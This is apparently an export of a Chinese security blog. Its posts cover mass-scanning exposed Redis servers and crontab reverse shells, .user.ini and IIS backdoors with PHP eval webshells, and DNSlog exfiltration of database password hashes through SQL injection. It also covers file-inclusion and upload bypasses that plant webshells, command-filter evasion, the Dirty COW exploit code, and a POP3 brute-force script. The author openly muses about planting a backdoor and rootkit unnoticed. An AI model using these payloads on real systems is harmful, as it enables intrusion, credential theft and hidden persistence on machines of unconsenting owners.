exit()def saveStrToFile(file,str): with open(file,'w') as output: output.write(str)def saveListToFile(file,list): s = '\n'.join(list) with open(file,'w') as output: output.write(s)def apiTest(): page = 1 global access_token with open('access_token.txt','r') as input: access_token = input.read() # 将 token 格式化并添加到 HTTP Header 中 headers = &#123; 'Authorization' : 'JWT ' + access_token, &#125; print headers while(True): try: r = requests.get(url = 'https://api.zoomeye.org/host/search?query="redis"&amp;page=' + str(page), headers = headers) ''' 因为我们进行的是主机搜索，所以请求的接口为: https://api.zoomeye.org/host/search?query="yoursring"&amp;facet=app,os&amp;page= 如果进行web搜索，请求接口为: https://api.zoomeye.org/web/search?query="port:21"&amp;page= ?query为要搜索的关键字 ''' r_decoded = json.loads(r.text) # print r_decoded # print r_decoded['total'] for x in r_decoded['matches']: print x['ip'] ip_list.append(x['ip']) print '[-] info : count ' + str(page * 10) except Exception,e: # 若搜索请求超过 API 允许的最大条目限制 或者 全部搜索结束，则终止请求 if str(e.message) == 'matches': print '[-] info : account was break, excceeding the max limitations' break else: print '[-] info : ' + str(e.message) else: if page == 10: break page += 1def main(): # 访问口令文件不存在则进行登录操作 if not os.path.isfile('access_token.txt'): print '[-] info : access_token file is not exist, please login' login() saveStrToFile('access_token.txt',access_token) apiTest() saveListToFile('zoomeye_ip_list.txt',ip_list)if __name__ == '__main__': main() 把要搜索的关键词改一下即可批量获取符合条件的主机地址： 然后就是redis的批量验证脚本,GitHub上有一个hackredis脚本能够验证redis未授权访问，然后批量登陆到ssh，但是我搜的，可能人品太差，一个都没登陆上，可能不对公网开放SSH服务了或者做了IP限制。 然后就换个思路，我们写入的密钥，会覆盖这个文件authorized_keys，如果原来服务器上管理员是使用过公钥的方法登陆就会导致管理员的公钥失效，容易被管理员发现。直接在redis下写个shell，种个后门，再加个rootkit，岂不是神不知道鬼不觉[斜眼] redis反弹shell： CentOS 1234567891011echo -e "\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/远程主机/2333 0&gt;&amp;1\n\n"|redis-cli -h 目标机 -x set 1config set dir /var/spool/cronokconfig set dbfilename rootoksaveok然后vps上nc监听nc -lvv 2333 Ubuntu如果是ubuntu的系统，是不能用bash弹shell的，可以使用python来反弹。 1echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n" 附加个建议：12345678可以配置redis.conf这个文件，在redis-3.2.0目录下#默认只对本地开放bind 127.0.0.1#添加登陆密码requirepass appleu0#在需要对外开放的时候修改默认端口port 2333#最后还可以配合iptables限制开放]]></content>
      <tags>
        <tag>运维</tag>
        <tag>渗透测试</tag>
        <tag>Python</tag>
        <tag>自动化</tag>
        <tag>Redis</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ini和iis后门]]></title>
    <url>%2F2017%2F01%2F03%2Fini%E5%92%8Ciis%E5%90%8E%E9%97%A8%2F</url>
    <content type="text"><![CDATA[最近看了两个关于ini和利用iis本身机制的后门。 ini后门.user.ini它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。 .user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。和php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说我修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载 利用方法 新建.user.ini，内容为： 1auto_prepend_file=test.gif 新建test.gif，内容为： 123&lt;?php @eval($_REQUEST[shell]);?&gt; 新建echo.php,内容为： 123&lt;?phpecho "PHP is very good!";?&gt; 访问echo.php即可看到后门： 1http://127.0.0.1:8080/php-backdoor/echo.php?shell=phpinfo(); iis后门iis后门是用了iis本身的机制，当在http头里增加一字段即可触发后门，并执行发过来的命令。 正常情况：123456789101112131415161718192021GET /pwet.htm HTTP/1.1Host: 192.168.73.143Accept-Encoding: identityConnection: Keep-AliveContent-type: application/x-www-form-urlencodedAccept: */*HTTP/1.1 200 OKDate: Thu, 03 Feb 2011 12:16:50 GMTContent-Length: 31Content-Type: text/htmlLast-Modified: Mon, 21 Jun 2010 11:53:19 GMTAccept-Ranges: bytesETag: "963779573811cb1:994"Server: Microsoft-IIS/6.0&lt;html&gt;Pouetpouet&lt;/html&gt; 加入恶意字段123456789101112131415161718192021222324252627282930313233343536373839GET /pwet.htm HTTP/1.1Host: 192.168.73.143Accept-Encoding: identityX-Order: ListDirConnection: Keep-AliveX-Data: QzpcContent-type: application/x-www-form-urlencodedAccept: */*HTTP/1.1 200 OKDate: Thu, 03 Feb 2011 12:16:57 GMTContent-Length: 353X-Resp: OKContent-Type: text/htmlLast-Modified: Mon, 21 Jun 2010 11:53:19 GMTAccept-Ranges: bytesETag: "963779573811cb1:994"Server: Microsoft-IIS/6.0&lt;html&gt;Pouetpouet&lt;/html&gt;[F] C:\AUTOEXEC.BAT[F] C:\boot.ini[F] C:\bootfont.bin[F] C:\CONFIG.SYS[D] C:\Documents and Settings[D] C:\Inetpub[F] C:\IO.SYS[F] C:\MSDOS.SYS[F] C:\NTDETECT.COM[F] C:\ntldr[F] C:\pagefile.sys[D] C:\Program Files[D] C:\System Volume Information[D] C:\WINDOWS[D] C:\wmpub]]></content>
      <tags>
        <tag>WAF绕过</tag>
        <tag>PHP</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试小技巧之DNSlog]]></title>
    <url>%2F2016%2F12%2F04%2Fdnslog%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[在渗透环境时，我们经常会遇到疑似命令执行还有些bool注入和延时注入，但是都没有回显。 命令执行我们可能会用各种各样的请求来判断是否存在命令执行，对于bool注入和延时注入这两种注入类型的缺点就是速度慢，效率低，一个是基于对错判断数据，一个是基于访问时间来判断数据，dnslog的出现就正好弥补了这样的缺陷。 0x00 原理这里参考一篇paper ,一个大牛的详细解释:DNS in SQL Injection Attacks 简单说就是：DNSLog 用于监测 DNS 和 HTTP 访问记录，可通过HTTP请求，让目标主机主动请求 DNSLog API 地址，有相应的解析记录，则可判定为存在相应的漏洞。 0x01 利用首先给大家分享一个免费的dnslog平台(ps:要是有cloudeye激活码的可以忽略)。 平台会给每一个会员分一个二级域名，xxx.ceye.io。 简单的来说，dnslog平台自己保留dns的日志信息，并对应每个会员一个二级域名，这样我们可以通过 ping test.xxxxx.ceye.io 这样的多级域名方式，把我们需要返回的信息链接到url中，然后分析日志，test部分就是我们得到的信息。 0x01.1 命令执行在我们找到命令执行漏洞的时候，我们可以执行这样的命令判断 12345linux:curl http://ip.port.domain.ceye.io/`whoami`ping `whoami`.ip.port.domain.ceye.iowindows:ping %USERNAME%.domain.ceye.io 这时候就可以去dnslog平台查看到信息 0x01.2 SQL注入SQL Server存储程序master..xp_dirtree（）用于获取所有文件夹的列表和给定文件夹内部的子文件夹。12345678DECLARE @host varchar(1024);注册一个名为@host的变量，类型为varchar。SELECT @host=CONVERT(varchar(1024),db_name())+'.xxxxxxxxx.ceye.io';获取db_name()然后转换成varchar类型，然后吧获取的db_name()返回值拼接到dnslog平台给我们的子域名里面，然后赋值给@host变量。EXEC('master..xp_dirtree "\\'+@host+'\foobar$"');列远程主机的foobar$目录,由于是远程主机，所以会做一个dns解析，这样我们的dns平台就能得到日志了http://xxxx.com.cn/?Id=123';DECLARE @host varchar(1024);SELECT @host=CONVERT(varchar(1024),db_name())+'.xxxxxxxxx.ceye.io';EXEC('master..xp_dirtree "\\'+@host+'\foobar$"');-- OracleUTL_INADDR包用于互联网的寻址–诸如检索本地和远程主机的主机名和IP的地址12345SELECT UTL_INADDR.GET_HOST_ADDRESS('ip.port.b182oj.ceye.io');SELECT UTL_HTTP.REQUEST('http://ip.port.b182oj.ceye.io/oracle') FROM DUAL;SELECT HTTPURITYPE('http://ip.port.b182oj.ceye.io/oracle').GETCLOB() FROM DUAL;SELECT DBMS_LDAP.INIT(('oracle.ip.port.b182oj.ceye.io',80) FROM DUAL;SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.ip.port.b182oj.ceye.io',80) FROM DUAL; MySQLMySQL的函数LOAD_FILE()读取文件内容并将其作为字符串返回：LOAD_FILE()1SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM user WHERE user='root' LIMIT 1),'.b182oj.ceye.io\\abc')); PostgreSQLPostgreSQL的声明COPY用于在文件系统的文件和表之间拷贝数据123456789101112131415DROP TABLE IF EXISTS table_output;CREATE TABLE table_output(content text);CREATE OR REPLACE FUNCTION temp_function()RETURNS VOID AS $$DECLARE exec_cmd TEXT;DECLARE query_result TEXT;BEGINSELECT INTO query_result (SELECT passwdFROM pg_shadow WHERE usename='postgres');exec_cmd := E'COPY table_output(content)FROM E\'\\\\\\\\'||query_result||E'.psql.ip.port.b182oj.ceye.io\\\\foobar.txt\'';EXECUTE exec_cmd;END;$$ LANGUAGE plpgsql SECURITY DEFINER;SELECT temp_function(); 写个脚本： 1234567891011import urllib2for i in range(50): if i==0: continue url = '''http://xxxx.com.cn/?Id=123';DECLARE @host varchar(1024);SELECT @host=CONVERT(varchar(1024),db_name())+'.xxxxxxxxx.ceye.io';EXEC('master..xp_dirtree "\\'+@host+'\foobar$"');--''' url = url.replace("dbid=1","dbid="+str(i)) req = urllib2.Request(url) print req.get_full_url() print urllib2.urlopen(req).read()]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>WAF绕过</tag>
        <tag>命令执行</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试的一些小技巧]]></title>
    <url>%2F2016%2F11%2F20%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[结合最近学习的知识，总结一下渗透测试中的一些小技巧，仅做参考。 0x01 PHP文件包含利用网站文件上传功能:，比如上传头像之类，可以尝试包含上传的文件。 利用php封装协议php://input和data://:，包含post数据造成php命令执行. 12http://example.com/test.php?url=php://inputPOST:&lt;?php fwrite(fopen("shell.php","w"),'&lt;?php eval($_POST["pass"]);?&gt;')?&gt; 包含log日志文件:当我们提交恶意代码时也会被记录，结合解析漏洞即可getshell(有读权限)。 apache日志默认在/etc/httpd/logs/access_log; 在日志文件中插入PHP代码 方法一 :使用burpsuit抓包访问 ，绕过浏览器编码&lt;&gt; 方法二 :curl 访问不存在的url curl http://example/shell.php?=&lt;?php phpinfo();?&gt; 这样php代码就被写到log里面了 包含一下日志： http://127.0.0.1/lfi/index.php?page=/etc/httpd/logs/access_log 包含/proc/self/environ文件:这需要PHP运行作为一个具有cgion/proc伪文件的系统且PHP脚本有权访问这些伪文件。 填写User-Agent字段如下：&lt;?system(&apos;wget http://eyidaima/shell.txt -O shell.php&apos;);?&gt; 包含会话文件:这需要攻击者能控制会话中的任何字符串值（注入代码，例如phpinfo(），会话文件必须存放在serializedsession文件且PHP脚本能够访问会话文件（通常是/tmp/sess_SESSIONID文件）。 包含其他由php应用创建的文件:只要你能想到的，都可以尝试创建,然后包含他，比如数据库文件，缓存文件，应用程序级别的日志。 0x02 利用.htaccess文件绕过黑名单.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。自定义.htaccess上传，内容如下：123&lt;FileMatch “shell.jpg”&gt; SetHandler application/x-httpd-php &lt;/FileMatch&gt; 同目录下，上传一个shell.jpg文件，内容是一句话，这个时候就成功绕过。 0x03 PHP流封装绕过截断技巧来源：王松 假设存在文件包含的代码为：1234&lt;?php $a = $_GET['file'];include $a.'.html.php';?&gt; 但是我们%00无法截断, 只能包含xxxx.html.php 首先我们新建一个hello.html.php，内容为phpinfo(); 然后压缩成zip 然后访问如下网址,即可成功包含压缩文件内的hello.html.php http://example/index.php?file=zip://test.zip%23hello 把我们输入的变量和include后面的变量合起来就是zip://test.zip#hello.html.php 代表当前目录下的test.zip压缩包里面的hello.html.php,于是就包含成功。 0x04 通用防注入系统getshell很多人渗透测试的时候，发现防注入系统，比如说记录了ip，时间，提交数据等等，通过阅读类似程序的源码得知数据记录在sqlin.asp。 提交如下数据：123┼攠數畣整爠煥敵瑳∨≡┩愾 密码 a (加密方式是:ANSI-&gt;Unicode；工具：UNICODE2ANSI)提交 and 1= ┼攠數畣整爠煥敵瑳∨≡┩愾 菜刀连接sqlin.asp即可。 0x05 iis+php黑名单上传突破技巧来源：P牛 在php+window+iis环境下:123双引号==点号;大于符号==问号;小于符号(“&lt;”)==星号(“*”); 该特性只能用于文件上传时覆盖已知的文件，于是这特性便略显鸡肋.不过P牛已经给出完美利用的方法： 思路如下： 利用冒号“：”截断 利用“&lt;”==“*”覆盖上传文件 我们都知道在文件上传时，我们往往会考虑到文件名截断，如%00,:去截断，如：bypass.php:jpg但是冒号截断产生的文件是空白的，里面并不会有任何的内容,虽然生成的php文件里面没有内容，但是php文件总生成了吧，所以我们可以结合上面所说的特性完美成功利用. 首先利用冒号生成我们将要覆盖的php文件，上传文件名为bypass.php:jpg的文件，截断之后产生一个bypass.php的空白php文件。 利用上面的系统特性覆盖该文件：&lt;就等于 *,而*代表任意字符burp里修改文件名为bypass.&lt;&lt;&lt;内容为一句话，这样，就会生成一个带有一句话木马的bypass.php文件。 0x06 命令执行绕过技巧来源：l3m0n escapeshellcmd：escapeshellcmd()对字符串中可能会欺骗 shell命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到exec()或system()函数，或者执行操作符之前进行转义为^,利用%1a，可以绕过过滤执行命令。 黑名单绕过 1234执行ls命令：a=l;b=s;$a$bcat hello文件内容：a=c;b=at;c=he;d=llo;$a$b $&amp;#123;c&amp;#125;$&amp;#123;d&amp;#125; 空格绕过 123456绕过空格$&amp;#123;IFS&amp;#125;cat$&amp;#123;IFS&amp;#125;hello或者在读取文件的时候利用重定向符&lt;&gt;cat&lt;&gt;hello 无回显无回显获取数据的需求还是挺大的，比如sql，xxe，xss等等，这个时候一般可以用dns/http通道来获取数据。linux： 1234curl xxxx.ceye.io/`whoami`ping -c 1 `whoami`.xxxx.ceye.io特殊字符或者是空格出现的话，这时候可以通过一些编码来，比如base64curl http://xxxx.ceye.io/$(id|base64) windows:1234567http请求：for /F %x in ('whoami') do start http://xxx.ceye.io/%xdns请求：获取计算机名：for /F "delims=\" %i in ('whoami') do ping -n 1 %i.xxx.dnslog.info获取用户名：for /F "delims=\ tokens=2" %i in ('whoami') do ping -n 1 %i.xxx.dnslog.info用powershell来base64数据for /F %x in ('whoami') do powershell $a=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('%x'));$b=New-Object System.Net.WebClient;$b.DownloadString('http://xxx.ceye.io/'+$a);]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>PHP</tag>
        <tag>webshell</tag>
        <tag>linux</tag>
        <tag>命令执行</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[“脏牛”漏洞浅析与复现]]></title>
    <url>%2F2016%2F11%2F02%2F%E2%80%9C%E8%84%8F%E7%89%9B%E2%80%9C%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[0x00 漏洞概述Linux内核的内存子系统在处理写时拷贝（Copy-on-Wirte）时存在条件竞争漏洞，导致可以破坏私有只读内存映射。一个低权限的本地用户能够利用此漏洞获取其他只读内存映射的写权限，有可能进一步导致提权漏洞漏洞编号：CVE-2016-5195 漏洞类型：内核竞态条件漏洞 漏洞危害：低权限用户利用该漏洞技术可以在全版本Liux系统上实现本地提权 影响范围：Linux内核&gt;=2.6.22(07年以后的) 0x01 漏洞利用POC地址 只要Linux内核&gt;=2.6.22即可 gcc命令是一个编译器套件，可用于编译多种语言源码. 编译选项中指定-pthread 会附加一个宏定义 -D_REENTRANT该宏会导致 libc 头文件选择那些thread-safe的实现。-o参数为编译后输出文件名。 执行命令进行将Dirty_COW字符串保存到readfile文件内(写入文件名和内容可自定义，但是如果该文件内容为空，会导致POC测试失败) 0404代表所有用户默认情况下对该文件只有读取权限，无法修改删除 通过./文件名 方式是执行该文件命令 后面一般附加空格参数。 执行dirtyc0w文件 readfile 是文件名参数 m00000...为利用漏洞写入的值. 发现该文件已被输入的字符串m0000...覆盖 0x02 漏洞形成原因Linux写时拷贝技术(copy-on-write) 在Linux程序中，fork（）会产生一个和父进程完全相同的子进程，但子进程在此后多会exec系统调用，出于效率考虑，linux中引入了“写时复制“技术，也就是只有进程空间的各段的内容要发生变化时，才会将父进程的内容复制一份给子进程。 竞态条件 竞态条件（race condition）是指设备或系统出现不恰当的执行时序，而得到不正确的结果。 inux内存管理–缺页异常处理 触发异常的线性地址处于用户空间的vma中，但还未分配物理页，如果访问权限OK的话内核就给进程分配相应的物理页。 触发异常的线性地址不处于用户空间的vma中，这种情况得判断是不是因为用户进程的栈空间消耗完而触发的缺页异常。 如果 是的话则在用户空间对栈区域进行扩展，并且分配相应的物理页，如果不是则作为一次非法地址访问来处理，内核将终结进程 缺页中断 缺页中断就是要访问的页不在主存，需要操作系统将其调入主存后再进行访问。在这个时候，被内存映射的文件实际上成了一个分页交换文件。 0x03 触发原理：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657void *madviseThread(void *arg)&#123; char *str; str=(char*)arg; int i,c=0; for(i=0;i&lt;100000000;i++) &#123;/*You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661&gt; This is achieved by racing the madvise(MADV_DONTNEED) system call&gt; while having the page of the executable mmapped in memory.*/ c+=madvise(map,100,MADV_DONTNEED); &#125; printf("madvise %d\n\n",c);&#125; void *procselfmemThread(void *arg)&#123; char *str; str=(char*)arg;/*You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16&gt; The in the wild exploit we are aware of doesn't work on Red Hat&gt; Enterprise Linux 5 and 6 out of the box because on one side of&gt; the race it writes to /proc/self/mem, but /proc/self/mem is not&gt; writable on Red Hat Enterprise Linux 5 and 6.*/ int f=open("/proc/self/mem",O_RDWR); int i,c=0; for(i=0;i&lt;100000000;i++) &#123;/*You have to reset the file pointer to the memory position.*/ lseek(f,(uintptr_t) map,SEEK_SET); c+=write(f,str,strlen(str)); &#125; printf("procselfmem %d\n\n", c);&#125; int main(int argc,char *argv[])&#123;/*You have to pass two arguments. File and Contents.*/ if (argc&lt;3) &#123; (void)fprintf(stderr, "%s\n", "usage: dirtyc0w target_file new_content"); return 1; &#125; pthread_t pth1,pth2;/*You have to open the file in read only mode.*/ f=open(argv[1],O_RDONLY); fstat(f,&amp;st); name=argv[1]; 调用write系统调用向/proc/self/mem文件中写入数据时，进入内核态后内核会调用get_user_pages函数获取要写入内存地址。get_user_pages会调用follow_page_mask来获取这块内存的页表项，并同时要求页表项所指向的内存映射具有可写的权限。 第一次获取内存的页表项会因为缺页而失败。get_user_page调用faultin_page进行缺页处理后第二次调用follow_page_mask获取这块内存的页表项，如果需要获取的页表项指向的是一个只读的映射，那第二次获取也会失败。这时候get_user_pages函数会第三次调用follow_page_mask来获取该内存的页表项，并且不再要求页表项所指向的内存映射具有可写的权限，这时是可以成功获取的，获取成功后内核会对这个只读的内存进行强制的写入操作。这个实现是没有问题的，因为本来写入/proc/self/mem就是一个无视映射权限的强行写入，就算是文件映射到虚拟内存中，也不会出现越权写：如果写入的虚拟内存是一个VM_PRIVATE的映射，那在缺页的时候内核就会执行COW操作产生一个副本来进行写入，写入的内容是不会同步到文件中的,如果写入的虚拟内存是一个VM_SHARE的映射，那mmap能够映射成功的充要条件就是进程拥有对该文件的写权限，这样写入的内容同步到文件中也不算越权了。&amp;oq=调用write系统调用向/proc/self/mem文件中写入数据时，进入内核态后内核会调用get_user_pages函数获取要写入内存地址。get_user_pages会调用follow_page_mask来获取这块内存的页表项，并同时要求页表项所指向的内存映射具有可写的权限。第一次获取内存的页表项会因为缺页而失败。get_user_page调用faultin_page进行缺页处理后第二次调用follow_page_mask获取这块内存的页表项，如果需要获取的页表项指向的是一个只读的映射，那第二次获取也会失败。这时候get_user_pages函数会第三次调用follow_page_mask来获取该内存的页表项，并且不再要求页表项所指向的内存映射具有可写的权限，这时是可以成功获取的，获取成功后内核会对这个只读的内存进行强制的写入操作。这个实现是没有问题的，因为本来写入/proc/self/mem就是一个无视映射权限的强行写入，就算是文件映射到虚拟内存中，也不会出现越权写：如果写入的虚拟内存是一个VM_PRIVATE的映射，那在缺页的时候内核就会执行COW操作产生一个副本来进行写入，写入的内容是不会同步到文件中的.如果写入的虚拟内存是一个VM_SHARE的映射，那mmap能够映射成功的充要条件就是进程拥有对该文件的写权限，这样写入的内容同步到文件中也不算越权了。 但是，在上述流程中，如果第二次获取页表项失败之后，另一个线程调用madvice(addr,addrlen,MADV_DONTNEED),其中addr~addrlen是一个只读文件的VM_PRIVATE的只读内存映射，那该映射的页表项会被置空。这时如果get_user_pages函数第三次调用follow_page_mask来获取该内存的页表项。由于这次调用不再要求该内存映射具有写权限，所以在缺页处理的时候内核也不再会执行COW操作产生一个副本以供写入。所以缺页处理完成后后第四次调用follow_page_mask获取这块内存的页表项的时候，不仅可以成功获取，而且获取之后强制的写入的内容也会同步到映射的只读文件中。从而导致了只读文件的越权写。但是，在上述流程中，如果第二次获取页表项失败之后，另一个线程调用madvice(addr,addrlen,MADV_DONTNEED),其中addr~addrlen是一个只读文件的VM_PRIVATE的只读内存映射，那该映射的页表项会被置空。这时如果get_user_pages函数第三次调用follow_page_mask来获取该内存的页表项。由于这次调用不再要求该内存映射具有写权限，所以在缺页处理的时候内核也不再会执行COW操作产生一个副本以供写入。所以缺页处理完成后后第四次调用follow_page_mask获取这块内存的页表项的时候，不仅可以成功获取，而且获取之后强制的写入的内容也会同步到映射的只读文件中。从而导致了只读文件的越权写。 0x04 修复建议升级对应版本.]]></content>
      <tags>
        <tag>运维</tag>
        <tag>渗透测试</tag>
        <tag>linux</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python实现12306车票查询]]></title>
    <url>%2F2016%2F10%2F10%2FPython%E5%AE%9E%E7%8E%B012306%E8%BD%A6%E7%A5%A8%E6%9F%A5%E8%AF%A2%2F</url>
    <content type="text"><![CDATA[今天准备给师傅一块去应急响应，票都定好了，发现忘带身份证了，MDZZ…所以我就这样错失了一次宝贵的机会…更™可恶的是我去退票，竟然给我说没有身份证退不了。。。我特么的要是有身份证，我还退你大爷啊。。。 所以想搞它，一想，算了，凭我这本事搞12306还是别装逼，所以就有了这个脚本。。。源代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#!/usr/bin/python# -*- coding: UTF-8 -*-'''@Author：w2n1ck@博客：http://byd.dropsec.xyz/'''import urllib2import jsonimport smtplibimport timeimport codecsfrom email.mime.text import MIMETextimport ssl# 记录日志def log(content): t = time.strftime('%Y-%m-%d %H:%M:%S') f = codecs.open('watcher.log', 'a', 'utf-8') f.write('[%s]%s\n' % (t, content)) f.close()# 发送邮件def send_mail(content): to_list=['xxx@qq.com'] mail_host = 'smtp.163.com' mail_user = 'xxx' mail_pass = 'xxx' mail_postfix = '163.com' me = "TicketsWatcher"+"&lt;"+mail_user+"@"+mail_postfix+"&gt;" msg = MIMEText(content,_subtype='plain',_charset='gb2312') msg['Subject'] = 'There are some tickets you need.' msg['From'] = me msg['To'] = ";".join(to_list) server = smtplib.SMTP() server.connect(mail_host) server.ehlo() server.starttls() server.login(mail_user,mail_pass) server.sendmail(me, to_list, msg.as_string()) server.close() log('sent mail successfully')try: # 请求地址根据实际要抓取的页面修改，参数包括日期、出发站、到达站 ssl._create_default_https_context = ssl._create_unverified_context resp = urllib2.urlopen("https://kyfw.12306.cn/otn/lcxxcx/query?purpose_codes=ADULT&amp;queryDate=2016-10-11&amp;from_station=NJH&amp;to_station=SHH") #print resp result = resp.read() #print result data = json.loads(result) datas = data['data']['datas'] print datas for d in datas: if d['station_train_code'] == 'T135': content = 'tickes for hard seat of %s: %s' % (d['station_train_code'], d['yz_num']) log(content) if unicode(d['yz_num']) != u"无": send_mail(content) breakexcept Exception, e: content = 'somethings wrong with the program:\n' + str(e) log(content) send_mail(content) 测试结果：说明： 脚本分为三部分： 记录日志 发送邮件 车票信息捕捉 记录日志会在脚本目录下生成一个watch.log文件，这个主要是得结合实时捕捉数据，你可以定时也可以使用crontab,这里我就没在加了(还有十个网站没测呢，政府网站真是尼玛啊，谁有比较好的经验望大牛们不吝分享，不说了都是泪…) 发送邮件部分主要用了smtplib和email库，具体代码为：12345to_list=['xxx@qq.com'] #接收通知的邮箱mail_host = 'smtp.163.com' #设置服务器mail_user = 'xxx' #替换为发件邮箱用户名,不带@后面的mail_pass = 'xxx' #替换为发件邮箱口令mail_postfix = '163.com' #发件箱的后缀 1msg = MIMEText(content,_subtype='plain',_charset='gb2312') 第一个参数就是邮件正文，第二个参数是MIME的subtype，传入’plain’，最终的MIME就是’text/plain’，最后设置编码为gb2312，不过为了兼容性，你可以使用utf-8，具体的过程函数我就不解释了。 信息抓取部分，很简单就是把数据变为数组，从数组中匹配信息。这里我遇到一个问题：urllib2.URLError: &lt;urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:590)&gt;这个错误信息主要是因为：SSL: CERTIFICATE_VERIFY_FAILEDPython 升级到 2.7.9 之后引入了一个新特性，当使用urllib.urlopen打开一个 https 链接时，会验证一次 SSL 证书。而当目标网站使用的是自签名的证书时就会抛出一个 urllib2.URLError: 的错误消息. 解决方案：1234import sslimport urllib2ssl._create_default_https_context = ssl._create_unverified_contextprint urllib2.urlopen("https://www.111cn.net/").read() 附： smtp协议的基本命令包括：123456789101112HELO 向服务器标识用户身份MAIL 初始化邮件传输 mail from:RCPT 标识单个的邮件接收人；常在MAIL命令后面,可有多个rcpt to:DATA 在单个或多个RCPT命令后,表示所有的邮件接收人已标识,并初始化数据传输,以.结束VRFY 用于验证指定的用户/邮箱是否存在；由于安全方面的原因,服务器常禁止此命令EXPN 验证给定的邮箱列表是否存在,扩充邮箱列表,也常被禁用HELP 查询服务器支持什么命令NOOP 无操作,服务器应响应OKQUIT 结束会话RSET 重置会话,当前传输被取消MAIL FROM 指定发送者地址RCPT TO 指明的接收者地址 SMTP会话的流程： ehlo auth login mail from rcpt to data quit 上面说的是最普通的情况，但是现在好多企业邮件都是安全邮件的，就是通过SSL发送的邮件，这个怎么发呢？SMTP对SSL安全邮件的支持有两种方案，一种老的是专门开启一个465端口来接收ssl邮件，另一种更新的做法是在标准的25端口的smtp上增加一个starttls的命令来支持。 这个很简单，smtplib里就有这个方法，叫smtplib.starttls()。当然，不是所有的邮件系统都支持安全邮件的，这个需要从ehlo的返回值里来确认，如果里面有starttls，才表示支持。 注意：以上的代码为了方便我都没有判断返回值，严格说来，是应该判断一下返回的代码的，在smtp协议中，只有返回代码是2xx或者3xx才能继续下一步，返回4xx或5xx的，都是出错了。]]></content>
      <tags>
        <tag>编程</tag>
        <tag>Python</tag>
        <tag>自动化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 邮箱爆破]]></title>
    <url>%2F2016%2F10%2F03%2FPython-%E9%82%AE%E7%AE%B1%E7%88%86%E7%A0%B4%2F</url>
    <content type="text"><![CDATA[按照师傅给的任务，写了一个企业邮箱的爆破脚本，后续还有FTP,SSH等一些爆破的脚本。 我先说下整体思路： 总体就是利用python的poplib模块来从pop3服务器上交互，根据获取的相关信息，产生结果。POP3协议并不复杂，它也是采用的一问一答式的方式，你向服务器发送一个命令，服务器必然会回复一个信息. 首先验证参数是否正确Sys.argv[]是用来获取命令行参数的，sys.argv[0]表示代码本身文件路径，所以参数从1开始 然后从用户密码文件中读取信息 pop.getwelcome()用来获取连接服务器的响应状态 然后就是脚本的核心代码部分 123456server = "pop.qiye.163.com" //设置pop3服务器地址pop = poplib.POP3(server,110) //连接pop3服务器pop.user(user) //验证用户名auth = pop.pass_(passwd) //验证密码if auth.split(' ')[0]== "+OK": //判断响应的结果是否“OK” pring user,passwd 最后输出出来相关的用户信息 脚本代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#!/usr/bin/python# -*- coding: UTF-8 -*-'''@Author：w2n1ck@博客：http://byd.dropsec.xyz/@Email Pop3 Brute Forcer'''import threading, time, random, sys, poplibfrom copy import copyif len(sys.argv) !=3: print "\t --------------------------------------------------\n" print "\t Usage: ./Emailpopbrute.py &lt;userlist&gt; &lt;passlist&gt;\n" sys.exit(1)server = "pop.qiye.163.com"success = []try: users = open(sys.argv[1], "r").readlines()except(IOError): print "[-] Error: urerlist打开失败!\n" sys.exit(1)try: words = open(sys.argv[2], "r").readlines()except(IOError): print "[-] Error: passlist打开失败!\n" sys.exit(1)try: pop = poplib.POP3(server,110) welcome = pop.getwelcome() print welcome pop.quit()except (poplib.error_proto): welcome = "No Response" passdef mailbruteforce(listuser,listpwd): if len(listuser) &lt; 1 or len(listpwd) &lt; 1 : print "An error occurred: No user or pass list" return 1 for user in listuser: for value in listpwd : user = user.replace("\n","") value = value.replace("\n","") try: print "-"*12 print "[+] User:",user,"Password:",value time.sleep(1) pop = poplib.POP3(server,110) pop.user(user) auth = pop.pass_(value) print auth if auth.split(' ')[0]!= "+OK" : pop.quit() print "unknown error !" continue if pop.stat()[1] is None or pop.stat()[1] &lt; 1 : 